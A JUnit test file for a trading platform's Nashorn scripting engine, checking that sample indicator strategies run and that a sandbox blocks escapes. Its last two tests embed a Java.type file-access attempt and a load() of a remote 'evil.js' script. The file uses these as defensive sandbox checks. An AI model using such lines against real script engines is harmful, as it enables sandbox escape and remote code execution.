package com.aitrade.trade.strategy.script;

import org.junit.jupiter.api.Test;

import javax.script.CompiledScript;
import java.util.HashMap;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.*;

/**
 * 验证 SCRIPT 策略前端"插入示例"按钮里那 4 个示例都能编译 + 运行通过。
 *
 * 历史回归点：
 *   - 早期 ScriptApi.macd/boll/kdj 返回 Indicators.Macd record，但 Nashorn 不把 record 的
 *     accessor(macd()) 当 JS 属性，导致脚本里 m.macd 拿到方法引用 → crossUp/last 全 fail
 *   - 早期 newEngine() 传了 --no-java，把已绑定 api 对象的方法调用也禁了，脚本里 api.rsi 直接 NPE
 *   - 早期 runDecide 用 invokeFunction + setBindings，多线程共享 engine 时有竞争
 */
class ScriptStrategySmokeTest {

    private final ScriptEngineFactory factory = new ScriptEngineFactory();

    private Map<String, Object> mockInputs() {
        int n = 60;
        double[] close = new double[n], open = new double[n], high = new double[n], low = new double[n], vol = new double[n];
        for (int i = 0; i < n; i++) {
            close[i] = 10 + Math.sin(i / 5.0) * 2 + i * 0.05;
            open[i] = close[i] - 0.1;
            high[i] = close[i] + 0.2;
            low[i] = close[i] - 0.2;
            vol[i] = 100000 + i * 100;
        }
        Map<String, Object> inputs = new HashMap<>();
        inputs.put("api", new ScriptApi("test"));
        inputs.put("open", open);
        inputs.put("close", close);
        inputs.put("high", high);
        inputs.put("low", low);
        inputs.put("vol", vol);
        inputs.put("price", close[n - 1]);
        inputs.put("holding", 0);
        inputs.put("costPrice", 0.0);
        inputs.put("code", "000001");
        inputs.put("name", "test");
        return inputs;
    }

    private Object runScript(String src) throws Exception {
        CompiledScript cs = factory.compile(src);
        return factory.runDecide(cs, mockInputs(), 2000);
    }

    @Test
    void sample_rsi() throws Exception {
        String src = "function decide() {\n" +
                "  var r = last(rsi(close, 14));\n" +
                "  if (holding === 0 && r < 30) return 'BUY';\n" +
                "  if (holding > 0 && r > 70) return 'SELL';\n" +
                "  return 'HOLD';\n" +
                "}\n";
        Object out = runScript(src);
        assertNotNull(out, "RSI 示例 decide() 不应返回 null");
        assertTrue(out.equals("BUY") || out.equals("SELL") || out.equals("HOLD"),
                "返回值必须是 BUY/SELL/HOLD，实际: " + out);
    }

    @Test
    void sample_macd_cross() throws Exception {
        // 这条历史 fail 在 m.macd / m.signal 拿到方法引用，crossUp 全是 false
        String src = "function decide() {\n" +
                "  var m = macd(close, 12, 26, 9);\n" +
                "  if (holding === 0 && crossUp(m.macd, m.signal)) return 'BUY';\n" +
                "  if (holding > 0 && crossDown(m.macd, m.signal)) return 'SELL';\n" +
                "  return 'HOLD';\n" +
                "}\n";
        Object out = runScript(src);
        assertNotNull(out);
        assertTrue(out.equals("BUY") || out.equals("SELL") || out.equals("HOLD"),
                "返回值必须是 BUY/SELL/HOLD，实际: " + out);
    }

    @Test
    void sample_boll() throws Exception {
        String src = "function decide() {\n" +
                "  var b = boll(close, 20, 2.0);\n" +
                "  var p = price;\n" +
                "  if (holding === 0 && p < last(b.lower)) return 'BUY';\n" +
                "  if (holding > 0 && p > last(b.upper)) return 'SELL';\n" +
                "  return 'HOLD';\n" +
                "}\n";
        Object out = runScript(src);
        assertNotNull(out);
    }

    @Test
    void sample_stoploss() throws Exception {
        String src = "function decide() {\n" +
                "  var m = macd(close, 12, 26, 9);\n" +
                "  if (holding === 0 && crossUp(m.macd, m.signal)) return 'BUY';\n" +
                "  if (holding > 0 && costPrice > 0) {\n" +
                "    var pct = (price - costPrice) / costPrice;\n" +
                "    if (pct >= 0.15) return 'SELL';\n" +
                "    if (pct <= -0.08) return 'SELL';\n" +
                "  }\n" +
                "  return 'HOLD';\n" +
                "}\n";
        Object out = runScript(src);
        assertNotNull(out);
    }

    @Test
    void sample_limit_up_breakout() throws Exception {
        // 首板打板示例：循环 / ma / rsi / log 综合用法，回归这段在 Nashorn 里不抛错
        String src = "function decide() {\n" +
                "  var n = close.length;\n" +
                "  if (n < 25) return 'HOLD';\n" +
                "  if (holding > 0 && costPrice > 0) {\n" +
                "    var pct = (price - costPrice) / costPrice;\n" +
                "    if (pct >= 0.05) return 'SELL';\n" +
                "    if (pct <= -0.03) return 'SELL';\n" +
                "    var r6 = last(rsi(close, 6));\n" +
                "    if (r6 < 40) return 'SELL';\n" +
                "    return 'HOLD';\n" +
                "  }\n" +
                "  var c = close[n - 1], cPrev = close[n - 2], v = vol[n - 1];\n" +
                "  var rise = (c - cPrev) / cPrev;\n" +
                "  if (rise < 0.095) return 'HOLD';\n" +
                "  var v5 = ma(vol, 5);\n" +
                "  var vAvg = v5[n - 2];\n" +
                "  if (!vAvg || v < vAvg * 1.5) return 'HOLD';\n" +
                "  var ma20 = last(ma(close, 20));\n" +
                "  if (c < ma20) return 'HOLD';\n" +
                "  for (var i = n - 6; i < n - 1; i++) {\n" +
                "    if ((close[i] - close[i - 1]) / close[i - 1] >= 0.095) return 'HOLD';\n" +
                "  }\n" +
                "  return 'BUY';\n" +
                "}\n";
        Object out = runScript(src);
        assertNotNull(out);
        assertTrue(out.equals("BUY") || out.equals("SELL") || out.equals("HOLD"),
                "返回值必须是 BUY/SELL/HOLD，实际: " + out);
    }

    @Test
    void sandbox_blocks_java_type() throws Exception {
        // ClassFilter 应阻止 Java.type 加载新类
        String src = "function decide() {\n" +
                "  try {\n" +
                "    var File = Java.type('java.io.File');\n" +
                "    return 'LEAK:' + String(File);\n" +
                "  } catch (e) {\n" +
                "    return 'BLOCKED';\n" +
                "  }\n" +
                "}\n";
        Object out = runScript(src);
        assertEquals("BLOCKED", out, "Java.type 应被 ClassFilter 拒绝");
    }

    @Test
    void sandbox_blocks_load() throws Exception {
        // ClassFilter 顺带阻止 load(URL)（load 本身在 Nashorn 是受 ClassFilter 限制的）
        String src = "function decide() {\n" +
                "  try {\n" +
                "    load('http://example.com/evil.js');\n" +
                "    return 'LEAK';\n" +
                "  } catch (e) {\n" +
                "    return 'BLOCKED';\n" +
                "  }\n" +
                "}\n";
        Object out = runScript(src);
        // load 可能因 ClassFilter 阻 URLClassLoader 加载、也可能因网络拒绝，但不应返回 LEAK
        assertNotEquals("LEAK", out, "load 不能拉到外部脚本");
    }
}
